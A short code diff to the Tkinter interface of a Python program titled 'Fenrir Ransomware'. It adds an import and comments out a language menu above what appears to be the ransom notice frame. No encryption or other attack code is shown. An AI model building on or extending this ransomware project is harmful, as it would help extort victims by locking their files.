@@ -9,6 +9,7 @@ import sys
 import time
 from threading import Thread
 import webbrowser
+import tkinter as tk
 
 class MyThread(Thread):
     def run(self):
@@ -28,12 +29,12 @@ fenrir = Tk()
 fenrir.title("Fenrir Ransomware")
 
 # Alertbar
-menubar = Menu(fenrir)
-menu1 = Menu(menubar, tearoff=0)
-menu1.add_command(label="Français")
-menu1.add_command(label="English")
-menubar.add_cascade(label="Langue/language", menu=menu1)
-fenrir.config(menu=menubar)
+#menubar = Menu(fenrir)
+#menu1 = Menu(menubar, tearoff=0)
+#menu1.add_command(label="Français", command=Fr)
+#menu1.add_command(label="English", command=En)
+#menubar.add_cascade(label="Langue/language", menu=menu1)
+#fenrir.config(menu=menubar)
 
 
 Oups = Frame(fenrir, borderwidth=5, relief=GROOVE, bg="red")
